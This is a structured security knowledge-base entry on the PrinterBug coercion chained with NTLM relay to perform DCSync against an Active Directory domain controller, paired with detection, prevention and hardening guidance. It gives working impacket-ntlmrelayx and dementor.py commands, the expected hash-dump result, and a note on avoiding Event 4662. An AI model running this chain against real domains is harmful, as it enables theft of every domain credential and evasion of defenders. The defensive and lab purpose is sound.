name: Print Spooler Bug + NTLM Relay (DCSync via PrinterBug)
description: The PrinterBug (2018) forces any Windows machine with Print Spooler enabled to authenticate to an attacker-controlled machine. Combined with NTLMRelayx, relay the DC's credential to another DC to perform DCSync without 4662 events. Requires SMB Signing disabled on target DC. Detection: Event 4624 for DC$ account originating from unexpected IP.
notes:
PrinterBug: abuses RpcRemoteFindFirstPrinterChangeNotification(Ex)
  → Any domain user can force RemoteServer$ to authenticate to any machine
  → Microsoft stance: 'by design', will not be fixed
  → Result: reverse auth carrying TGT (NTLM or Kerberos depending on config)

Prerequisites:
  → Print Spooler service running on target DC
  → SMB Signing disabled on target DC (for relay to work)
  → Attacker controls listener machine reachable from target DC

Lab setup:
  → Kali (<KALI_IP>) runs NTLMRelayx + dementor.py
  → DC1 (<DC1_IP>) has Print Spooler enabled
  → DC2 (<DC2_IP>) is the relay target (SMB Signing off)

=== ATTACK ===
# Terminal 1 (Kali): Start NTLMRelayx targeting DC2 for DCSync
impacket-ntlmrelayx -t dcsync://<DC2_IP> -smb2support
  → Waits for incoming NTLM auth from DC1
  → When DC1 authenticates, relays to DC2 as DC1 and performs DCSync

# Terminal 2 (Kali): Trigger PrinterBug — force DC1 to connect back to Kali
python3 ./dementor.py <KALI_IP> <DC1_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>
  → <USER>: any valid domain user (e.g., bob)
  → Expected error: RPC_S_INVALID_NET_ADDR (0x6ab) — normal, attack still works

# Terminal 1: Observe DCSync output
  → Hashes for all domain accounts are dumped
  → No Event 4662 generated (relay impersonates DC, not a user)

=== DETECTION ===
Event 4624: Successful logon
  → DC1$ (computer account) logging in from Kali's IP (<KALI_IP>)
  → DC$ accounts should ONLY authenticate from DC IP addresses
  → Any DC$ logon from non-DC IP = critical alert

Network-based detection:
  → Unusual outbound connections from DC to port 445 toward non-DC IPs
  → Block outbound 139/445 from DC to non-DC machines

=== PREVENTION ===
  → Disable Print Spooler on all non-print servers
  → Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers
              RegisterSpoolerRemoteRpcEndPoint = 2 (disable remote RPC endpoint)
              (value 1 = enabled, 2 = disabled — blocks remote coercion while keeping local printing)
  → Enable SMB Signing on all Domain Controllers
  → Block outbound TCP 139/445 from DCs to non-DC machines

examples.label: Start NTLMRelayx targeting DC2 for DCSync (Terminal 1)
Trigger PrinterBug — coerce DC1 to connect to Kali (Terminal 2)

recommended.note: Coercer — more comprehensive tool that abuses all known RPC coercion functions.
ESC8: relay coerced connection to ADCS instead of another DC for a DC certificate.

defense.why_it_works: The PrinterBug (RpcRemoteFindFirstPrinterChangeNotification) lets any domain user force a machine running Print Spooler to authenticate back to an attacker. With SMB signing disabled on the target DC, that inbound auth is relayed to a second DC to perform DCSync.
defense.prerequisites: Print Spooler running on the target DC; SMB signing disabled on the relay-target DC; an attacker-controlled listener reachable from the coerced DC; any valid domain user.
defense.impact: DCSync against the relay-target DC — full domain hash extraction — achieved WITHOUT generating the usual 4662 replication events (the relay impersonates the DC, not a user).
defense.detection: Event 4624 showing a DC$ computer account logging on from a non-DC IP (the attacker's listener). DC$ accounts should only authenticate from DC addresses, so any DC$ logon from a non-DC IP is a critical alert. Watch for unusual outbound 445 from a DC to non-DC hosts.
defense.artifacts: DC$ 4624 logon from the attacker IP; ntlmrelayx / dementor execution on the attacker host; RPC_S_INVALID_NET_ADDR (0x6ab) error at the coercion step (expected, attack still works).
defense.prevention: Disable Print Spooler on all non-print servers; set RegisterSpoolerRemoteRpcEndPoint = 2 to block remote RPC coercion; enable SMB signing on all Domain Controllers; block outbound TCP 139/445 from DCs to non-DC machines.
defense.evasion: The relay impersonates the DC computer account rather than a user, so no Event 4662 (DCSync's usual tell) is produced — defenders relying only on 4662 will miss it.
defense.misconfiguration: The Windows Print Spooler service (spoolsv.exe) is enabled on non-print-server machines and exposes MS-RPRN (RpcRemoteFindFirstPrinterChangeNotification). Any authenticated user can coerce the DC or any host running Spooler to authenticate outbound to an attacker-controlled machine via this RPC call. Combined with NTLM relay to LDAP/LDAPS, this grants write access to AD — including adding Shadow Credentials or changing msDS-AllowedToDelegateTo for privilege escalation.
defense.vulnerable_config:
# Print Spooler running on DC (the critical enabler):
Get-Service Spooler -ComputerName dc01
# Status: Running  StartType: Automatic

# LDAP relay possible because LDAP signing not enforced:
# ldapdomainrelay (impacket-ntlmrelayx -t ldap://dc01)
# DC authenticates to attacker -> attacker relays to DC's LDAP -> writes Shadow Credentials

# LDAPS + channel binding NOT enforced (default):
# Registry: HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
#   LdapEnforceChannelBinding = 0  (not enforced)
defense.secure_config:
# Fix 1 — Disable Print Spooler on all DCs and non-print-servers:
Stop-Service Spooler; Set-Service Spooler -StartupType Disabled
# GPO: Computer Config > System Services > Print Spooler = Disabled

# Fix 2 — Block remote Spooler access while keeping local printing:
# GPO: Computer Config > Admin Templates > Printers
#   'Allow Print Spooler to accept client connections' = Disabled

# Fix 3 — Enforce LDAP signing + channel binding:
# HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters:
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' \
    -Name 'LdapEnforceChannelBinding' -Value 2
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' \
    -Name 'LDAPServerIntegrity' -Value 2
# These block NTLM relay to LDAP/LDAPS even if coercion succeeds

# Fix 4 — Apply PrintNightmare patches: KB5004945, KB5005033
